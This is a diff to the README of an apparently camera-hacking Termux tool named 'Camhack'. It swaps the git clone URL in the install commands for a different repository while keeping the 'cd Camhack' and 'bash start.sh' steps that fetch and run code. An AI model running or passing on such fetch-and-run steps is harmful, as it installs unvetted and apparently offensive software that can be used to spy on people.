@@ -52,7 +52,7 @@ This tool requires a basic Termux setup and a few command-line steps.
 
 ### Termux Full Install and Setup 
 ```
-pkg update && pkg upgrade && pkg install git && git clone https://github.com/thakur2309/Camhack.git && cd Camhack && chmod +X start.sh && bash start.sh
+pkg update && pkg upgrade && pkg install git && git clone https://github.com/Arman-Tools/Arman-king-projects.git && cd Camhack && chmod +X start.sh && bash start.sh
 ```
 
 ### [TERMUX] Packege Install Comments
@@ -67,7 +67,7 @@ pkg install php
 pkg install git
 ```
 ```
-git clone https://github.com/thakur2309/Camhack.git
+git clone https://github.com/Arman-Tools/Arman-king-projects.git
 ```
 ```
 cd Camhack
